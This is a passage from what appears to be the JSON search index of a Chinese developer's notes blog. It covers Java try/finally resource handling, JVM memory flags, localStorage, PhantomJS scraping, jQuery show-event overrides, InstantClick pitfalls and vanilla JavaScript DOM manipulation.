{\nps.println(\"This data is written to a file:\");\n        System.out.println(\"Write successfully\");\n    } catch (IOException e) {\n        System.err.println(\"Error in writing to file\");\nthrow e;\n}\n}\n</code></pre> <p>\u666e\u901a\u7684try-catch\u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u5728finally\u4e2d\u91ca\u653e\u8d44\u6e90\uff1a</p> <pre><code>public static void main(String args[]) throws IOException { PrintStream ps = null;\n\ntry {\nps = new PrintStream(new FileOutputStream(\"myfile.txt\"));\nps.println(\"This data is written to a file:\");\n        System.out.println(\"Write successfully\");\n    } catch (IOException e) {\n        System.err.println(\"Error in writing to file\");\nthrow e;\n} finally {\nif (ps != null) ps.close();\n}\n}\n</code></pre>"},{"location":"Java/#jvm","title":"JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570","text":"<p>From: http://blog.chinaunix.net/uid-26863299-id-3559878.html</p> <p>\u5e38\u89c1\u53c2\u6570\u79cd\u7c7b\uff1a\u914d\u7f6e\u5806\u533a\u7684\uff08-Xms \u3001-Xmx\u3001-XX:newSize\u3001-XX:MaxnewSize\u3001-Xmn\uff09\u3001\u914d\u7f6e\u975e\u5806\u533a\uff08-XX:PermSize\u3001-XX:MaxPermSize\uff09\u3002</p> <p>\u5806\u533a\u7684\uff1a</p> <p>1\u3001-Xms \uff1a\u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u521d\u59cb\u5185\u5b58\u5206\u914d\u7684\u5927\u5c0f</p> <p>2\u3001-Xmx\uff1a \u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u53ef\u88ab\u5206\u914d\u7684\u6700\u5927\u4e0a\u9650\uff0c\u901a\u5e38\u4f1a\u5c06 -Xms \u4e0e -Xmx\u4e24\u4e2a\u53c2\u6570\u7684\u914d\u7f6e\u76f8\u540c\u7684\u503c\uff0c\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u591f\u5728java\u5783\u573e\u56de\u6536\u673a\u5236\u6e05\u7406\u5b8c\u5806\u533a\u540e\u4e0d\u9700\u8981\u91cd\u65b0\u5206\u9694\u8ba1\u7b97\u5806\u533a\u7684\u5927\u5c0f\u800c\u6d6a\u8d39\u8d44\u6e90\u3002</p> <p>3\u3001-XX:newSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u521d\u59cb\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5e94\u8be5\u5c0f\u4e8e -Xms\u7684\u503c\uff1b</p> <p>4\u3001-XX:MaxnewSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u53ef\u88ab\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\uff1b\u5f53\u7136\u8fd9\u4e2a\u503c\u5e94\u8be5\u5c0f\u4e8e -Xmx\u7684\u503c\uff1b</p> <p>5\u3001-Xmn\uff1a\u5bf9 -XX:newSize\u3001-XX:MaxnewSize\u4e24\u4e2a\u53c2\u6570\u7684\u540c\u65f6\u914d\u7f6e</p> <p>\u975e\u5806\u533a\u7684\uff1a</p> <p>1\u3001-XX:PermSize\uff1a\u8868\u793a\u975e\u5806\u533a\u521d\u59cb\u5185\u5b58\u5206\u914d\u5927\u5c0f\uff0c\u540d\u5b57\u6765\u6e90\u4e8epermanent size</p> <p>2\u3001-XX:MaxPermSize\uff1a\u8868\u793a\u5bf9\u975e\u5806\u533a\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\u3002</p> <p>\u6700\u5927\u5806\u5185\u5b58\u4e0e\u6700\u5927\u975e\u5806\u5185\u5b58\u7684\u548c\u4e0d\u80fd\u591f\u8d85\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7684\u53ef\u7528\u5185\u5b58\u3002</p>"},{"location":"JavaScript/","title":"JavaScript","text":""},{"location":"JavaScript/#localstorage","title":"\u4f7f\u7528localStorage","text":"<p>Cookie\u5b58\u6570\u636e\u5f71\u54cd\u8bbf\u95ee\u901f\u5ea6(\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u5e26\u4e0aCookie)\uff0c\u4f7f\u7528localStorage\u5b58\u50a8\u6709\u66f4\u5927\u5bb9\u91cf\uff0c\u8fd8\u4e0d\u6613\u4e22\u5931</p> <p>\u5efa\u8bae\u5c06\u7528\u6237\u7684\u5927\u6bb5\u8f93\u5165\u968f\u65f6\u5b58\u50a8\u5230localStorage\u4e2d</p> <p>\u9ad8\u7ea7\u5e94\u7528\u53ef\u4ee5\u662f\u628ajs\u7b49\u4ee3\u7801\u6587\u4ef6\u8fd9\u6837\u7f13\u5b58\u5230\u672c\u5730\uff0c\u5b89\u5168\u6027\u8ba8\u8bba\u89c1https://imququ.com/post/enhance-security-for-ls-code.html</p> <pre><code>//\u5199\u5165\nvar storage=window.localStorage;\nstorage[\"a\"]=1;\n//\u6e05\u7a7a\nwindow.localStorage.clear();\n</code></pre>"},{"location":"JavaScript/#phantomjs","title":"\u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875","text":"<p>\u6709\u4e9b\u65f6\u5019\u6211\u4eec\u7528Python\u7684requests\u5e76\u4e0d\u80fd\u5f88\u5b8c\u7f8e\u5730\u6e32\u67d3\u597d\u7f51\u9875\uff0c\u4f8b\u5982\u4eba\u5bb6\u7528\u9177\u70ab\u7684js\u4f5c\u56fe\u4e86\uff0c\u6211\u5c31\u60f3\u5f97\u5230\u8fd9\u5f20\u56fe\uff0c\u8fd9\u65f6\u5019\u7528phantomjs\u5c31\u597d\u5566</p> <p>\u722c\u53d6\u76ee\u6807\uff1a</p> <p>http://oncokb.org/#/gene/AKT1</p> <p>\u8fd9\u4e2a\u7f51\u9875\u7684\u53f3\u8fb9\u6709\u4e00\u5f20Tumor Types with AKT1 Mutations\u7684\u56fe</p> <p>\u4ee3\u7801\uff1a</p> <p>code/spider.oncokb.js</p> <p>\u4ee3\u7801\u7684\u7ec6\u8282\uff1a</p> <ol> <li> <p>\u6253\u5f00\u9875\u9762\u4e4b\u524d\u4e3a\u4e86\u622a\u56fe\u65b9\u4fbf\u9700\u8981\u5148\u8bbe\u7f6e\u6d4f\u89c8\u5668\u7684\u5927\u5c0f\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4e861920*1080</p> </li> <li> <p>\u4e0d\u8981\u4e00\u6253\u5f00\u9875\u9762\u5c31\u622a\u56fe\uff0c\u800c\u662f\u7b49\u5230\u9875\u9762\u52a0\u8f7d\u597d\u4e86\u6700\u540e\u4e00\u4e2a\u8bf7\u6c42(\u4eceChrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u67e5\u770b\u6700\u540e\u7684\u8bf7\u6c42\u662f\u5565)\u540e\uff0c\u518d\u7b49\u5f855s\u540e\u6267\u884c\u622a\u56fe\u3001\u5bfc\u51faHTML\u5e76\u9000\u51fa</p> </li> <li> <p>\u4e3a\u4e86\u9632\u6b62\u65e0\u9650\u7b49\u5f85\uff0c\u8bbe\u7f6e\u6700\u957f2min\u540etimeout\u9000\u51fa</p> </li> <li> <p>\u4e3a\u4e86\u65b9\u4fbf\u6279\u91cf\u5316\u5904\u7406\uff0c\u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u9700\u8981\u722c\u53d6\u7684\u57fa\u56e0\u540d\u79f0</p> </li> <li> <p>\u5728\u8fd0\u884c\u7684\u65f6\u5019\u6709\u8bbe\u7f6e\u4ee3\u7406\u548c\u4e0d\u8981\u8f7d\u5165\u56fe\u7247\u7684\u53c2\u6570\uff0c\u5177\u4f53\u89c1\u5b98\u65b9\u6587\u6863</p> </li> </ol>"},{"location":"JavaScript/#jqueryshow","title":"jQuery\u52ab\u6301show\u4e8b\u4ef6","text":"<p>\u6211\u7684\u9700\u6c42\uff1a\u7528\u6237\u767b\u5f55\u7684div\u9700\u8981\u70b9\u51fbLogin\u540e\u663e\u793a(toggle)\uff0c\u6b64\u65f6\u6d4f\u89c8\u5668\u5df2\u7ecf\u81ea\u52a8\u5e2e\u7528\u6237\u586b\u4e0a\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u7528\u6237\u9700\u8981\u624b\u52a8\u70b9\u51fb\u767b\u5f55\u6309\u94ae\u624d\u4f1a\u89e6\u53d1\u767b\u5f55\u8bf7\u6c42\uff1b\u73b0\u5728\u6211\u60f3\u52a0\u5165\u5feb\u901f\u767b\u5f55\u529f\u80fd\uff0c\u5728\u663e\u793a\u767b\u5f55div\u540e\u81ea\u52a8\u63d0\u4ea4\u767b\u5f55\u8bf7\u6c42\uff0c\u5982\u679c\u4e3a\u7a7a\u6216\u5bc6\u7801\u9519\u8bef\u518d\u4ea4\u7ed9\u7528\u6237\u8f93\u5165</p> <p>\u6211\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u52a0\u5165\u4e0b\u8ff0\u6269\u5c55jQuery\u7684\u4ee3\u7801\u540e\uff0c\u5bf9#login\u7ed1\u5b9abeforeShow\u4e8b\u4ef6\uff0c\u5904\u7406\u51fd\u6570\u5148\u6839\u636e\u5168\u5c40\u53d8\u91cf\u662f\u5426\u5b58\u5728\u6765\u5224\u65ad\u662f\u5426\u6267\u884c\u8fc7\uff08\u9632\u6b62\u6b7b\u5faa\u73af\uff09\uff0c\u5982\u679c\u6ca1\u6709\u6267\u884c\u8fc7\u5219\u6267\u884c\u767b\u5f55\u51fd\u6570clicklogin\u5e76\u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf</p> <p>\u6548\u679c\uff1a\u5982\u679c\u6d4f\u89c8\u5668\u81ea\u52a8\u586b\u5165\u4e86\u6b63\u786e\u7684\u7528\u6237\u540d\u5bc6\u7801\uff0c\u5219\u7528\u6237\u70b9\u51fbLogin\u540e\u5feb\u901f\u95ea\u8fc7\u767b\u5f55\u8f93\u5165\u6846\u5373\u5b8c\u6210\u767b\u5f55\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u6ca1\u6709\u81ea\u52a8\u586b\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0cclicklogin\u51fd\u6570\u76f4\u63a5return\uff0c\u7528\u6237\u6ca1\u6709\u611f\u77e5\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u586b\u5165\u7684\u5bc6\u7801\u662f\u9519\u7684\uff0c\u7528\u6237\u4f1a\u770b\u5230\u5bc6\u7801\u9519\u8bef\u63d0\u793a\uff0c1s\u540e\u518d\u6b21toggle\u767b\u5f55\u7684div\u8981\u6c42\u7528\u6237\u8f93\u5165</p> <p>From: http://stackoverflow.com/questions/1225102/jquery-event-to-trigger-action-when-a-div-is-made-visible</p> <p>\u5f15\u5165jQuery\u540e\uff0c\u4fee\u6539jQuery\u81ea\u8eab\u7684show\u51fd\u6570\u4ee5\u6269\u5c55bind\uff1a</p> <pre><code>jQuery(function($) {\n\nvar _oldShow = $.fn.show;\n\n$.fn.show = function(speed, oldCallback) {\nreturn $(this).each(function() {\nvar obj  = $(this),\nnewCallback = function() {\nif ($.isFunction(oldCallback)) {\noldCallback.apply(obj);\n}\nobj.trigger('afterShow');\n};\n\n// you can trigger a before show if you want\nobj.trigger('beforeShow');\n\n// now use the old function to show the element passing the new callback\n_oldShow.apply(obj, [speed, newCallback]);\n});\n}\n});\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528bind\u6ce8\u518c<code>beforeShow</code>\uff0c<code>afterShow</code>\u54af\uff1a</p> <pre><code>jQuery(function($) {\n  $('#test')\n.bind('beforeShow', function() {\n      alert('beforeShow');\n}) .bind('afterShow', function() {\n      alert('afterShow');\n})\n.show(1000, function() {\n      alert('in show callback');\n})\n.show();\n});\n</code></pre>"},{"location":"JavaScript/#get","title":"\u8bfb\u53d6GET\u53c2\u6570","text":"<p>\u6709\u4e9b\u65f6\u5019\u5bf9GET\u53c2\u6570\u7684\u5904\u7406\u4ea4\u7ed9\u4e86\u524d\u7aef\uff0c\u540e\u7aef\u7684PHP\u53ef\u4ee5$_GET[\u201cparameter\u201d]\uff0c\u524d\u7aefJS\u548b\u529e\u5462\uff1f</p> <p>From: http://stackoverflow.com/questions/979975/how-to-get-the-value-from-the-get-parameters</p> <pre><code>var QueryString = function () {\n// This function is anonymous, is executed immediately and // the return value is assigned to QueryString!\nvar query_string = {};\nvar query = window.location.search.substring(1);\nvar vars = query.split(\"&amp;\");\nfor (var i=0;i&lt;vars.length;i++) {\nvar pair = vars[i].split(\"=\");\n// If first entry with this name\nif (typeof query_string[pair[0]] === \"undefined\") {\nquery_string[pair[0]] = decodeURIComponent(pair[1]);\n// If second entry with this name\n} else if (typeof query_string[pair[0]] === \"string\") {\nvar arr = [ query_string[pair[0]],decodeURIComponent(pair[1]) ];\nquery_string[pair[0]] = arr;\n// If third or later entry with this name\n} else {\nquery_string[pair[0]].push(decodeURIComponent(pair[1]));\n}\n} return query_string;\n}();\n</code></pre> <p>\u6267\u884c\u540e\u5c31\u53ef\u4ee5\u8fd9\u4e48\u4f7f\u7528\uff1a</p> <pre><code>if (typeof(QueryString.parameter)!=\"undefined\") {\n    alert(QueryString.parameter);//do something with the parameter\n}\n</code></pre>"},{"location":"JavaScript/#github-issue","title":"\u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a","text":"<p>\u4eba\u5bb6\u5927\u4f6c\u7684\u9879\u76ee\uff1ahttp://github.com/wzpan/comment.js\uff0c\u4e2d\u6587\u6587\u6863</p> <p>\u5982\u679c\u89c9\u5f97cloudflare\u52a0\u8f7d\u901f\u5ea6\u4e0d\u4f73\uff0c\u53ef\u4ee5\u628a\u6240\u6709js\u6253\u5305\u6210\u4e00\u4e2a\u6587\u4ef6</p> <p>\u6548\u679c\u5982\u672c\u535a\u5ba2\u9875\u9762\u5e95\u90e8\u8bc4\u8bba\u533a\u6240\u793a\uff0c\u4e3a\u4e86\u5077\u61d2\u5c31\u6ca1\u6709\u4e3a\u6bcf\u4e2amd\u6587\u4ef6\u5355\u72ec\u5f00issue\u4e86\uff0c\u6574\u4e2ablog\u5171\u7528\u4e00\u4e2aissue</p>"},{"location":"JavaScript/#historyreplacestate","title":"history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55","text":"<p>\u5982v2ex\u6309\u7167\u662f\u5426:visited\u6765\u533a\u5206\u70b9\u5f00\u8fc7\u548c\u6ca1\u70b9\u5f00\u8fc7\u7684\u5e16\u5b50\uff0c\u5176\u5b9e\u73b0\u662furl\u5e26\u4e0a#reply\u56de\u590d\u6570\u91cf</p> <p>\u4f46\u5982\u679c\u5e16\u5b50\u9875\u9762\u6709\u591a\u79cd\u8fdb\u5165\u65b9\u5f0f\uff08\u81ea\u52a8\u8df3\u8f6c\u5230\u9875\u5c3e\u3001\u53d1\u8d77\u4e86\u56de\u590d\u7b49\uff09\uff0c\u90a3\u4e48url\u5e76\u4e0d\u4e00\u5b9a\u4e0e\u9700\u8981\u7684\u4e00\u81f4</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528history API\u6765\u4fee\u6539\u5386\u53f2\u8bb0\u5f55\uff0c\u4ece\u800c\u4fdd\u8bc1\u5e26\u4e0a<code>#reply\u56de\u590d\u6570\u91cf</code>\u7684url\u4e00\u5b9a\u88ab\u8ba4\u4e3a\u8bbf\u95ee\u8fc7\uff1b\u800c\u4e14\u81ea\u52a8\u6539\u56de\u53bb\u7528\u6237\u65e0\u611f\u77e5\uff08\u5426\u5219\u5237\u65b0\u540e\u4f1a\u6253\u5f00\u4e0d\u4e00\u6837\u7684\u9875\u9762\uff09</p> <p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>&lt;script&gt;\nsetTimeout( function(){\n    var oldurl = location.href;\n    history.replaceState(null, null, '/t/{{topic[\"id\"]}}#reply{{topic[\"replyCount\"]}}');\n    history.replaceState(null, null, oldurl);\n}, 1000);\n&lt;/script&gt;\n</code></pre>"},{"location":"JavaScript/#checkboxlocalstorage","title":"\u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001\uff08\u7528localStorage\uff09","text":"<p>\u67e5\u8be2\u662f\u5426\u52fe\u9009\u7528<code>.is(\":checked\")</code> \uff0c \u6539\u53d8\u52fe\u9009\u72b6\u6001\u7528<code>.prop(\"checked\",true)</code></p> <pre><code>&lt;script&gt;\nfunction checkbox_onclick(){\n    var checked = $(\"#thecheckbox\").is(\":checked\");\n    if(checked) localStorage.setItem(\"status_thecheckbox\",\"1\");\n    else localStorage.setItem(\"status_thecheckbox\",\"0\");\n}\n&lt;/script&gt;\n&lt;input type=\"checkbox\" id=\"thecheckbox\" onclick='checkbox_onclick();'&gt;\n&lt;script&gt;\nvar status_thecheckbox = localStorage.getItem(\"status_thecheckbox\");\n    if(status_thecheckbox!=null &amp;&amp; status_thecheckbox==\"1\") $(\"#thecheckbox\").prop(\"checked\",true);\n&lt;/script&gt;\n</code></pre>"},{"location":"JavaScript/#nodejs","title":"NodeJS","text":""},{"location":"JavaScript/#dockernpm","title":"\u7528Docker\u6267\u884cnpm","text":"<p>\u4f8b\u5982\u5b89\u88c5canvas\u548cgifencoder\u5305\uff1a</p> <pre><code>PACKAGES=\"canvas gifencoder\"\ndocker run --rm --volume=\"`pwd`:/app\" -w /app -it node:10 npm install ${PACKAGES}  --registry=https://registry.npm.taobao.org\n</code></pre>"},{"location":"JavaScript/#instantclick","title":"\u4f7f\u7528InstantClick\u8e29\u5751","text":""},{"location":"JavaScript/#_1","title":"\u5feb\u901f\u4f7f\u7528","text":"<p>http://instantclick.io/v3.1.0/instantclick.min.js</p> <p>\u4e00\u5b9a\u8981\u5728\u9875\u9762\u5e95\u90e8 <code>&lt;/body&gt;</code>\u4e4b\u524d\u624d\u80fd\u5f15\u5165\uff1a</p> <pre><code>&lt;script src=\"instantclick.min.js\" data-no-instant&gt;&lt;/script&gt;\n&lt;script data-no-instant&gt;InstantClick.init('mousedown');&lt;/script&gt;\n</code></pre>"},{"location":"JavaScript/#302","title":"\u88ab\u9884\u52a0\u8f7d\u7684\u9875\u9762\u4e0d\u80fd\u8ba9\u540e\u7aef\u8fd4\u56de302","text":"<p>\u5426\u5219\u4f1a\u663e\u793a\u8df3\u8f6c\u4e4b\u524d\u7684URL</p> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u94fe\u63a5\u7981\u6b62\u9884\u52a0\u8f7d\uff08\u4e0d\u8fc7\u66f4\u5e94\u8be5\u8003\u8651\u8fd9\u79cd\u94fe\u63a5\u6539\u4e3apost\u8bf7\u6c42\uff09 \u5728a\u6807\u7b7e\u52a0\u4e0a<code>data-no-instant</code></p>"},{"location":"JavaScript/#_2","title":"\u6ce8\u610f\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u540e\u7aef\u5c06\u88ab\u9891\u7e41\u8bf7\u6c42 \u9891\u7387\u9650\u5236\u9700\u8981\u653e\u5bbd","text":"<p>\u5b98\u7f51\u7ed9\u51fa\u7684\u4ee3\u7801\u4f7f\u7528<code>InstantClick.init()</code>\uff0c\u610f\u5473\u7740\u9f20\u6807\u79fb\u52a8\u4e0a\u53bb\u5c31\u4f1a\u89e6\u53d1\u52a0\u8f7d\uff08\u4e0d\u662f\u53ea\u89e6\u53d1\u4e00\u6b21\uff09\uff0c\u9f20\u6807\u53cd\u590d\u79fb\u52a8\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u8bf7\u6c42</p> <p>\u5982\u679c\u540e\u7aef\u505a\u4e86\u8bf7\u6c42\u9891\u7387\u9650\u5236 \u9700\u8981\u653e\u5bbd\u9650\u5236</p> <p>\u8fd8\u662f\u6539\u4e3a\u7528<code>mousedown</code>\u6765\u521d\u59cb\u5316 \u53ea\u6709\u7528\u6237\u786e\u5b9e\u70b9\u51fb\u4e86\u624d\u5f00\u59cb\u52a0\u8f7d \u636e\u8bf4\u4e5f\u80fd\u6709\u5f88\u597d\u7684\u6548\u679c</p>"},{"location":"JavaScript/#instantclick-js","title":"InstantClick\u5f15\u5165\u4e00\u4e9b\u526f\u4f5c\u7528 \u5bf9\u9875\u9762js\u8981\u8fdb\u884c\u4fee\u6539","text":""},{"location":"JavaScript/#jsreferrer","title":"js\u65e0\u6cd5\u53d6\u5f97\u6b63\u786e\u7684referrer","text":"<p>\u9875\u9762\u52a0\u8f7d\u7684\u8bf7\u6c42\u662fjs\u6267\u884c\u7684 document.referrer\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e0a\u4e00\u9875</p>"},{"location":"JavaScript/#documentaddeventlistener","title":"document.addEventListener \u91cd\u590d\u89e6\u53d1","text":"<p>\u4f8b\u5982\u7ed1\u5b9apaste\u4e8b\u4ef6 \u4f60\u53ef\u80fd\u8fd9\u4e48\u5199\uff1a</p> <pre><code>document.addEventListener('paste', handlepaste);\n</code></pre> <p>\u5728\u5207\u6362\u9875\u9762\u540e \u8fd9\u4e2a\u4e8b\u4ef6\u4f1a\u591a\u6b21\u7ed1\u5b9a \u5bfc\u81f4\u591a\u6b21\u89e6\u53d1</p> <p>\u6211\u7684\u505a\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5b58\u5728 \u4e0d\u5b58\u5728\u624d\u8bbe\u7f6e\uff1a</p> <pre><code>if(typeof paste_registered == \"undefined\"){\ndocument.addEventListener('paste', handlepaste);\npaste_registered = true;\n}\n</code></pre> <p>\u4f60\u4e5f\u53ef\u4ee5\u628a\u8fd9\u4e00\u90e8\u5206\u4e0d\u80fd\u91cd\u590d\u6267\u884c\u7684\u4ee3\u7801\u653e\u5165<code>&lt;script data-no-instant&gt;</code>\u4e2d\uff0c\u4f46\u5982\u679c\u524d\u4e00\u9875\u6ca1\u6709\u8fd9\u4e00\u5757\u4ee3\u7801\uff08\u4e5f\u5c31\u662f\u8fd9\u4e2a\u4ee3\u7801\u662f\u5f53\u524d\u9875\u9762\u624d\u6709\u7684\uff0c\u9700\u8981\u6267\u884c\u4e00\u6b21\uff09\uff0c\u8fdb\u5165\u5f53\u524d\u9875\u9762\u662f\u4e0d\u4f1a\u89e6\u53d1\u7684</p>"},{"location":"JavaScript/#js","title":"\u8fd4\u56de\u4e0a\u4e00\u9875\u91cd\u590d\u6267\u884c\u9875\u9762\u6dfb\u52a0\u5143\u7d20\u7684js \u5bfc\u81f4\u5143\u7d20\u91cd\u590d\u51fa\u73b0","text":"<p>\u73b0\u5728\u7684\u65b9\u6cd5\u662f\u5bf9js\u52a8\u6001\u6dfb\u52a0\u7684\u5143\u7d20\u52a0\u4e2aclass \u7136\u540e\u7528jQuery\u7684remove\u65b9\u6cd5\u5148\u901a\u901a\u5220\u6389\u518d\u6dfb\u52a0</p>"},{"location":"JavaScript/#ready","title":"\u9875\u9762ready\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1","text":"<p>\u9700\u8981\u52a0\u5165<code>InstantClick.on('change', callback);</code> \u52a0\u5230Init\u540e\u5373\u53ef</p> <p>\u4f46\u662f\u4f3c\u4e4e\u8fd9\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u5728\u9875\u9762\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u4e4b\u524dOrz \u4e0d\u591f\u5b8c\u7f8e</p>"},{"location":"JavaScript/#hash","title":"\u8d85\u94fe\u63a5\u7684#hash\u5b9a\u4f4d\u529f\u80fd\u4e5f\u9700\u8981\u81ea\u5df1\u5b9e\u73b0","text":"<p>\u9884\u52a0\u8f7d\u7684\u9875\u9762\u603b\u662f\u5b9a\u4f4d\u5230\u9876\u90e8\uff0c\u5ffd\u89c6\u5730\u5740\u680f\u4e2d\u7684<code>#end</code>\u8fd9\u79cd\u5b9a\u4f4dhash</p> <p>\u6211\u7684\u505a\u6cd5\u662f\u8fd9\u6837\u5199\u4e0a\u8ff0onchange\u7684callback\u51fd\u6570<code>implement_hashjump</code>\uff1a</p> <pre><code>function has_hashjump(){ // if there is a #hash present for jumpping, return true\nvar hash = document.location.hash.replace(\"#\",\"\");\nif(!hash) return false;\nif(document.getElementById(hash) || document.getElementsByName(hash).length&gt;0) return true;\nelse return false;\n}\n\nfunction implement_hashjump() {\nif ( has_hashjump() ) {\nvar hash = document.location.hash.replace(\"#\",\"\");\nif(document.getElementById(hash)) {\ndocument.documentElement.scrollTop = $(\"#\"+hash).offset().top;\n}\nelse{\ndocument.documentElement.scrollTop = $(\"[name='\"+hash+\"']\").offset().top;\n}\n}\n}\n</code></pre>"},{"location":"JavaScript/#javascriptdom-the-basics-of-dom-manipulation-in-vanilla-javascript","title":"\u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9 The Basics of DOM Manipulation in Vanilla JavaScript","text":"<p>https://www.sitepoint.com/dom-manipulation-vanilla-javascript-no-jquery/</p>"},{"location":"JavaScript/#_3","title":"\u9009\u62e9\u5143\u7d20","text":"<pre><code>const myElement = document.querySelector('#foo &gt; div.bar')\nmyElement.matches('div.bar') === true\n</code></pre> <p>\u6ce8\u610fquerySelector\u662f\u7acb\u5373\u6267\u884c \u800cgetElementsByTagName\u662f\u53d6\u503c\u7684\u65f6\u5019\u6267\u884c\u6548\u7387\u66f4\u9ad8</p> <p>\u5bf9\u5143\u7d20\u5217\u8868\u904d\u5386\u5e94\u8be5\u8fd9\u4e48\u5199\uff1a</p> <pre><code>[].forEach.call(myElements, doSomethingWithEachElement)\n</code></pre> <p><code>myElement.children</code>,<code>myElement.firstElementChild</code> \u53ea\u4f1a\u6709tag\uff0c\u800c<code>myElement.childNodes</code>,<code>myElement.firstChild</code>\u4f1a\u6709\u6587\u672c\u8282\u70b9</p> <p>\u5982\uff1a<code>myElement.firstChild.nodeType === 3 // this would be a text node</code></p>"},{"location":"JavaScript/#class","title":"\u4fee\u6539class\u548c\u5c5e\u6027","text":"<pre><code>myElement.classList.add('foo')\nmyElement.classList.remove('bar')\nmyElement.classList.toggle('baz')\n\n// Set multiple properties using Object.assign()\nObject.assign(myElement, {\nvalue: 'foo',\nid: 'bar'\n})\n\n// Remove an attribute\nmyElement.value = null\n</code></pre> <p>\u9664\u4e86\u76f4\u63a5\u8d4b\u503c\uff0c\u8fd8\u6709\u8fd9\u4e9b\u65b9\u6cd5<code>.getAttibute(), .setAttribute() and .removeAttribute()</code> \u4f46\u4ed6\u4eec\u4f1a\u76f4\u63a5\u4fee\u6539HTML \u5bfc\u81f4\u91cd\u7ed8 \u53ea\u6709\u6ca1\u6709\u5bf9\u5e94\u5c5e\u6027\u7684\u65f6\u5019\u5982<code>colspan</code>\u624d\u5e94\u8be5\u8fd9\u4e48\u5e72</p>"},{"location":"JavaScript/#css","title":"\u4fee\u6539CSS","text":"<pre><code>myElement.style.marginLeft = '2em'\n\n//\u83b7\u5f97\u8ba1\u7b97\u51fa\u6765\u7684CSS\u5c5e\u6027\ngetComputedStyle(myElement).getPropertyValue('margin-left')\n</code></pre>"},{"location":"JavaScript/#dom","title":"\u4fee\u6539DOM","text":"<pre><code>const myNewElement = document.createElement('div')\nconst myNewTextNode = document.createTextNode('some text')\n\n// Append element1 as the last child of element2\nelement1.appendChild(element2)\n\n// Insert element2 as child of element 1, right before element3\nelement1.insertBefore(element2, element3)\n\n// Create a clone\nconst myElementClone = myElement.cloneNode()\nmyParentElement.appendChild(myElementClone)\n\n// \u5220\u9664\u4e00\u4e2a\u8282\u70b9\nmyElement.parentNode.removeChild(myElement)\n</code></pre> <p>\u5f53\u9700\u8981\u628a\u591a\u4e2a\u5143\u7d20appendChild\u5230\u4e00\u4e2a\u5df2\u7ecf\u5728\u9875\u9762\u4e0a\u7684\u5143\u7d20\u65f6\uff0c\u6bcf\u6b21append\u90fd\u4f1a\u91cd\u7ed8 \u8fd9\u65f6\u5019\u5c31\u5e94\u8be5\u7528<code>DocumentFragment</code></p> <pre><code>const fragment = document.createDocumentFragment()\n\nfragment.appendChild(text)\nfragment.appendChild(hr)\nmyElement.appendChild(fragment)\n</code></pre>"},{"location":"JavaScript/#_4","title":"\u76d1\u542c\u4e8b\u4ef6","text":"<p>\u4e8b\u4ef6event\u91cc\u9762\u6709<code>target</code>\u6307\u5411\u8c01\u89e6\u53d1\u7684\u4e8b\u4ef6</p> <pre><code>const myForm = document.forms[0]\nconst myInputElements = myForm.querySelectorAll('input')\n\nArray.from(myInputElements).forEach(el =&gt; {\nel.addEventListener('change', function (event) {\nconsole.log(event.target.value)\n})\n})\n</code></pre>"},{"location":"JavaScript/#_5","title":"\u963b\u6b62\u9ed8\u8ba4\u884c\u4e3a","text":"<p><code>.preventDefault()</code></p> <p><code>.stopPropagation()</code> \u5b50\u8282\u70b9click\u4e0d\u4f1a\u518d\u5192\u6ce1\u89e6\u53d1\u7236\u8282\u70b9onclick</p>"},{"location":"JavaScript/#event-delegation","title":"Event delegation","text":"<p>\u5bf9\u8868\u5355\u6bcf\u4e2ainput\u4fee\u6539\u65f6\u6267\u884c\uff0c\u76f4\u63a5\u5bf9form\u6dfb\u52a0change\u7684\u4e8b\u4ef6 \u4e0d\u9700\u8981\u5bf9\u6bcf\u4e2ainput\u6dfb\u52a0\uff0c\u8fd9\u6837\u4e5f\u81ea\u52a8\u652f\u6301\u52a8\u6001\u65b0\u6dfb\u52a0\u7684input</p> <pre><code>myForm.addEventListener('change', function (event) {\nconst target = event.target\nif (target.matches('input')) {\nconsole.log(target.value)\n}\n})\n</code></pre>"},{"location":"JavaScript/#_6","title":"\u52a8\u753b","text":"<p>\u9700\u8981\u9ad8\u6027\u80fd\u65f6 \u4e0d\u8981\u7528setTimeout \u800c\u4f7f\u7528<code>requestAnimationFrame</code></p> <pre><code>const start = window.performance.now()\nconst duration = 